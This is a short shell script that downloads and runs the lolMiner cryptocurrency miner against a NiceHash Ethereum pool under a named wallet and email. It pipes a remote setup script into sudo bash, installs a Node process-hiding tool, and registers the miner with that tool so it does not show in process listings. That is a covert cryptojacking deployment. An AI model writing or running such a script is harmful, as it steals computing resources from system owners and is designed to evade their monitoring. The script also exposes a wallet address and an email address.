#!/bin/sh
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider  && apt-get install screen -y && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz && tar -xf lolMiner_v1.28a_Lin64.tar.gz && cd 1.28a/ && ./lolMiner --coin ETH  --pool stratum+tcp://daggerhashimoto.hk.nicehash.com --port 3353 --user 3LAWoQJw82H4mAtFFuDRVL4Mt8RV6DHVgo.LOL-VAPERS86 --ethstratum ETHPROXY --pass eckotrader86@gmail.com && sudo ph add "lolminer"
